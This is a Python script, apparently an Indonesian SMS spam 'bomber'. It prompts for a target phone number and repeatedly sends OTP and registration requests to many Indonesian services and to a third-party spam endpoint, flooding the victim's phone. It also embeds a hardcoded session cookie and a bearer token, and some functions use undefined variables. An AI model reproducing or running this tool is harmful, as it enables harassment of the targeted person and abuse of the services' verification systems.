

import os,sys,time,re,requests,json
from requests import post
from time import sleep
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro1(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def call2():
    ua={
    "Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":c})
    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def olx():
    req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":w,"language":"id"}).json()
def call():
    head = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
    "Content-Type": "application/json",
    "Origin": "https://id.jagreward.com",
    "Referer": "https://id.jagreward.com/member/register/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
    "_ga": "GA1.2.2037151396.1584709855",
    "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
    "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
    }
    r = requests.get("https://id.jagreward.com/member/verify-mobile/"+c+"/", headers=head)
def soplai():
    ua={
    "Host": "api.sooplai.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "origin": "https://www.sooplai.com",
    "referer": "https://www.sooplai.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
def depop():
    ua={
    "Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
def rupa():
     ua={
     "Host": "wapi.ruparupa.com",
     "Connection": "keep-alive",
     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
     "Accept": "application/json",
     "Content-Type": "application/json",
     "X-Company-Name": "odi",
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
     "user-platform": "mobile",
     "X-Frontend-Type": "mobile",
     "Origin": "https://m.ruparupa.com",
     "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     }
     dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
     r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text   
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    if r:
        print ("SUCCES MENGIRIM PESAN KE",no)    
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        print ("SUCCES MENGIRIM PESAN KE",no)
    else:
        print ("[!] GAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET")
        time.sleep(4)
        print ("[!] GAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET")
        time.sleep(4) 
        print ("[!] GAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET\n\n")
        time.sleep(1)
        sys.exit()
os.system("clear")
time.sleep(1)
kata("""\033[1;96m[!] Loading Cuk. . .
\033[1;96mOrang sabar disayang tuhan:)""")
time.sleep(10)

os.system("clear")
intro("""
\033[1;96m╔═╗\033[1;97m╦═╗╔═╗╔╦╗     \033[1;96m╔═╗\033[1;97m╔╦╗╔═╗
\033[1;96m╚═╗\033[1;97m╠═╝╠═╣║║║ <•> \033[1;96m╚═╗\033[1;97m║║║╚═╗
\033[1;96m╚═╝\033[1;97m╩  ╩ ╩╩ ╩     \033[1;96m╚═╝\033[1;97m╩ ╩╚═╝""")
intro1("""
\033[1;96m╔════════════════════════════════╗
\033[1;96m║\033[1;33m➢ \033[1;97mAuthor : \033[1;33mC4N_CyBer            \033[1;96m║
\033[1;96m║\033[1;33m➣ \033[1;97mYouTube: \033[1;33mCANDRA - NM          \033[1;96m║
\033[1;96m║\033[1;33m➢ \033[1;97mContoh : \033[1;33mGunakan +62          \033[1;96m║
\033[1;96m╚════════════════════════════════╝\n""")
time.sleep(1)
no = input("\033[1;33m[+] \033[1;97mMasukan No Target : \033[1;33m")
for i in range(1,4):
    sleep(1)
    call2()
    alodoc()
    olx()
    call()
    soplai()
    depop()
    rupa()
    marco()
    mapclub()
